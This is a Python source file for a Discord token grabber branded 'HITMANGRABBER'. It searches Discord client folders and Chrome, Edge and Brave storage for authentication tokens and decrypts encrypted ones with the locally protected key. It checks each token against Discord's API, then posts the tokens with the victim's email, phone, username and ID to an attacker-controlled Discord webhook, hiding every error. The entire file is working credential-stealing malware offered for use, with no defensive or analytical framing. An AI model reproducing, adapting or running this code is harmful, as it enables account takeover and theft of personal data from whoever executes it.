import requests as r
import json as j
import os as o
import re as e
import base64 as b
import subprocess as s
import sys as y
from Crypto.Cipher import AES
import win32crypt
import asyncio

WEBHOOK_URL = "your_discord_webhook_url_here"

def setup():
    modules = [("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")]
    for module, pip_name in modules:
        try:
            __import__(module)
        except:
            s.check_call([y.executable, "-m", "pip", "install", pip_name], 
                        stdout=s.DEVNULL, stderr=s.DEVNULL, stdin=s.DEVNULL)

setup()

def send_webhook(embed_data):
    try:
        data = {
            "username": "HITMANGRABBER",
            "avatar_url": "https://cdn.discordapp.com/attachments/1420574144373854359/1438704517762777280/image.png",
            "embeds": [embed_data]
        }
        r.post(WEBHOOK_URL, json=data, timeout=5)
    except:
        pass

def get_user_data(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    try:
        response = r.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
        return response.json() if response.status_code == 200 else None
    except:
        return None

def find_discord_tokens():
    local = o.getenv('LOCALAPPDATA')
    roaming = o.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Discord Development': roaming + '\\DiscordDevelopment'
    }

    def extract_tokens(path):
        path += "\\Local Storage\\leveldb"
        found_tokens = []
        if not o.path.exists(path):
            return found_tokens
            
        for file in o.listdir(path):
            if not file.endswith((".ldb", ".log")):
                continue
            try:
                with open(o.path.join(path, file), "r", errors="ignore") as f:
                    content = f.read()
                    patterns = [
                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                        r"mfa\.[\w-]{84}",
                        r"dQw4w9WgXcQ:[^\"]*"
                    ]
                    for pattern in patterns:
                        found_tokens.extend(e.findall(pattern, content))
            except:
                continue
        return found_tokens

    def decrypt_token(encrypted_token, key):
        try:
            if encrypted_token.startswith("dQw4w9WgXcQ:"):
                encrypted_value = encrypted_token.split("dQw4w9WgXcQ:")[1]
                encrypted_value = b.b64decode(encrypted_value)
                iv = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(ciphertext).decode('utf-8')
        except:
            pass
        return encrypted_token

    valid_tokens = []
    for platform, path in paths.items():
        if not o.path.exists(path):
            continue
            
        tokens = extract_tokens(path)
        key = None
        local_state_path = o.path.join(path, "Local State")
        if o.path.exists(local_state_path):
            try:
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = j.load(f)
                encrypted_key = b.b64decode(local_state["os_crypt"]["encrypted_key"])
                encrypted_key = encrypted_key[5:]
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            except:
                pass

        for token in tokens:
            if key and token.startswith("dQw4w9WgXcQ:"):
                decrypted_token = decrypt_token(token, key)
            else:
                decrypted_token = token

            if decrypted_token in valid_tokens:
                continue

            user_data = get_user_data(decrypted_token)
            if user_data:
                valid_tokens.append(decrypted_token)

    return valid_tokens

def find_browser_tokens():
    tokens = []
    paths = [
        o.path.join(o.environ['APPDATA'], 'discord'),
        o.path.join(o.environ['APPDATA'], 'discordptb'),
        o.path.join(o.environ['APPDATA'], 'discordcanary'),
        o.path.join(o.environ['LOCALAPPDATA'], 'Google', 'Chrome'),
        o.path.join(o.environ['LOCALAPPDATA'], 'Microsoft', 'Edge'),
        o.path.join(o.path.expanduser('~'), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser'),
    ]
    
    patterns = [
        r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,40}",
        r"mfa\.[\w-]{80,}",
        r"(eyJ[a-zA-Z0-9]{10,}\.eyJ[a-zA-Z0-9]{10,}\.[a-zA-Z0-9_-]{10,})"
    ]
    
    for path in paths:
        if not o.path.exists(path):
            continue
            
        for root, _, files in o.walk(path):
            for file in files:
                if file.lower().endswith(('.log', '.ldb', '.sqlite', '.db')):
                    try:
                        file_path = o.path.join(root, file)
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            for pattern in patterns:
                                tokens.extend(e.findall(pattern, content))
                    except:
                        continue
    
    return list(set(tokens))

async def scan_and_send_tokens():
    try:
        discord_tokens = find_discord_tokens()
        browser_tokens = find_browser_tokens()
        
        all_valid_tokens = []
        
        for token in discord_tokens:
            user_data = get_user_data(token)
            if user_data:
                token_info = {
                    'token': token,
                    'user_data': user_data,
                    'type': 'discord'
                }
                all_valid_tokens.append(token_info)
        
        for token in browser_tokens:
            user_data = get_user_data(token)
            if user_data:
                token_info = {
                    'token': token,
                    'user_data': user_data,
                    'type': 'browser'
                }
                all_valid_tokens.append(token_info)
        
        if all_valid_tokens:
            discord_count = len([t for t in all_valid_tokens if t['type'] == 'discord'])
            browser_count = len([t for t in all_valid_tokens if t['type'] == 'browser'])
            
            for i, token_info in enumerate(all_valid_tokens, 1):
                user_data = token_info['user_data']
                token_type = "Discord App" if token_info['type'] == 'discord' else "Browser"
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_data.get('id', '')}/{user_data.get('avatar', '')}.png" if user_data.get('avatar') else "https://discord.com/assets/2c21aeda16de354ba5334551a883b481.png"
                
                token_embed = {
                    "title": f"Token #{i} ({token_type})",
                    "color": 0xFF0000,
                    "thumbnail": {"url": avatar_url},
                    "fields": [
                        {"name": "Token", "value": f"```{token_info['token']}```", "inline": False},
                        {"name": "Username", "value": f"```{user_data.get('username', 'N/A')}#{user_data.get('discriminator', '0000')}```", "inline": True},
                        {"name": "Email", "value": f"```{user_data.get('email', 'N/A')}```", "inline": True},
                        {"name": "Phone", "value": f"```{user_data.get('phone', 'N/A')}```", "inline": True},
                        {"name": "User ID", "value": f"```{user_data.get('id', 'N/A')}```", "inline": True}
                    ],
                    "footer": {
                        "text": "github.com/hitmanos/tokengrabber | HITMAN"
                    }
                }
                send_webhook(token_embed)
            
            summary_embed = {
                "title": "Scan Complete",
                "color": 0xFF0000,
                "description": f"**Total Tokens:** {len(all_valid_tokens)}\n**Discord Apps:** {discord_count}\n**Browsers:** {browser_count}",
                "footer": {
                    "text": "github.com/hitmanos/tokengrabber | HITMAN"
                }
            }
            send_webhook(summary_embed)
        else:
            no_tokens_embed = {
                "title": "Scan Complete",
                "color": 0xFF0000,
                "description": "No valid Discord tokens found",
                "footer": {
                    "text": "github.com/hitmanos/tokengrabber | HITMAN"
                }
            }
            send_webhook(no_tokens_embed)
            
    except Exception as e:
        pass

def main():
    asyncio.run(scan_and_send_tokens())

if __name__ == "__main__":

    main()

